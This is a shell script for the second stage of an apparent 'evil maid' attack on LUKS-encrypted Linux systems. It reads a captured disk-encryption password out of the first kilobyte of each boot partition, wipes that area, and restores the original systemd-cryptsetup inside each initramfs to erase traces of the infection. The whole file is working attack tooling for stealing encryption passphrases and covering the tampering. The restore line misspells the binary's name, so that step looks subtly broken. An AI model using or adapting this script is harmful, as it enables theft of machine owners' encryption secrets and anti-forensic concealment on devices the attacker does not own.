#!/bin/sh

# Retrieve the LUKS password and clean every traces of the infection

bootroot="/mnt/boot_infect"
mkdir -p $bootroot/boot

sector_lines="`/sbin/fdisk -l 2> /dev/null  | /bin/grep '^/dev/'`"
sectors=`echo "$sector_lines" | /bin/grep "\*" | /bin/sed 's#^\(/dev/[a-zA-Z1-9]*\).*#\1#'`

for sector in $sectors; do

	cd $bootroot
	# Retrieve the password by copying the first 1024 bytes of the sector
	sectorname=`echo $sector | tr -d /`
	dd bs=1024 count=1 if=$sector of=passdump-$sectorname
	# Erase the password by putting zeros
	dd bs=1024 count=1 if=/dev/zero of=$sector

	mount $sector $bootroot/boot
	cd $bootroot/boot
	# Desinfection of the initramfs
	for initr in `ls initramfs-3*.img`; do
		mkdir initramfs
		cd initramfs
		gunzip < ../$initr | cpio -i
		cd lib/systemd
		# Replace our systemd-cryptsetup by the real one which was saved
		mv $bootroot/$initr-systemd-cryptsetup.old systemd-cryptestup
		cd ../..
		find ./ | cpio -H newc -o > initramfs.cpio
		gzip initramfs.cpio
		mv initramfs.cpio.gz ../$initr
		cd ..
		rm -rf initramfs
	done
	cd ..
	umount $bootroot/boot
done
rm -rf $bootroot/boot



